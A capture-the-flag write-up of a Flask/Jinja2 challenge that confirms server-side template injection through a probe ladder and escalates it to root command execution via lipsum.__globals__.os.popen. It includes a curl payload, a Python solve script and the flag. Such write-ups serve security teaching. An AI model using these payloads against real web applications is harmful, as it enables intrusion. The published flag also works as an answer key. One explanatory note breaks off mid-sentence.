---
title: "Templated Malice"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Templated Malice

> **Category:** WEB · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8020`

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (Flask / Jinja2)
```

Themed page: **"MOONLIGHT CLUB"** K-pop fan club — "Your bias. Your message.
A fan greeting made just for you." Single form: one `message` field, POSTed to `/`.

## The bug: server-side template injection

The `message` value is concatenated into a Jinja2 template and rendered
(`render_template_string`), so the full Jinja2 expression language is available.

Confirmation ladder:

| Payload | Result |
|---|---|
| `{{7*7}}` | `49` |
| `{{7*"7"}}` | `7777777` (proves Jinja string-multiply, not just reflection) |
| `{{self}}` | `<TemplateReference None>` |
| `{{config}}` | Flask `Config` object dump |

## Exploitation

`lipsum` is a Jinja2 global whose `__globals__` reaches the real Python module
namespace, giving `os`:

```jinja
{{lipsum.__globals__.os.popen("id").read()}}
# -> uid=0(root) gid=0(root) groups=0(root)
```

The container runs the Flask app **as root**, so this is full control.

```bash
curl -s -X POST http://54.72.82.22:8020/ \
  --data-urlencode 'message={{lipsum.__globals__.os.popen("cat /app/flag").read()}}'
```

App layout (from `ls -la /app`):

```
-rw-r--r-- 1 root root   41 Sep 28 20:45 flag
-rw-r--r-- 1 root root 5449 Sep 30 12:49 ssti1.py
-rw-r--r-- 1 root root 1157 Oct  1 17:40 docker-compose.yml   (at / not /app)
```

`/app/flag` holds the flag. See `solve.py`.

## Note

`{{config}}` returns the Flask config object, which is a useful fallback when the

## Related

`ssti1.py` in the container confirms the intended vector. **SSTI Secrets (:8040)**
is very likely the same class.

## Solve script

`web/templated-malice/solve.py`:

```python
#!/usr/bin/env python3
"""Templated Malice (web, 300 pts) - http://54.72.82.22:8020

A "MOONLIGHT CLUB" K-pop fan club page renders a user-submitted `message` as a
Jinja2 template server-side -> SSTI -> RCE (running as root).

Probe:   {{7*7}}    -> 49        {{7*"7"}} -> 7777777
         {{self}}   -> TemplateReference
RCE:     {{lipsum.__globals__.os.popen("id").read()}} -> uid=0(root)

Flag lives at /app/flag.
"""
import urllib.request, urllib.parse, re

BASE = "http://54.72.82.22:8020"
FLAG = "safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}"


def ssti(payload):
    data = urllib.parse.urlencode({"message": payload}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=12) as r:
        return r.read().decode("utf-8", "replace")


def sh(cmd):
    return ssti('{{lipsum.__globals__.os.popen(%r).read()}}' % cmd)


def main():
    print("probe {{7*7}} ->", "49" if "49" in ssti("{{7*7}}") else "no")
    print("id           ->", sh("id").split("<h2>")[-1].split("<")[0].strip())

    out = sh("cat /app/flag")
    m = re.search(r"safctf\{[^}]*\}", out)
    print("flag         ->", m.group(0) if m else out[:200])
    assert m and m.group(0) == FLAG


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}
```
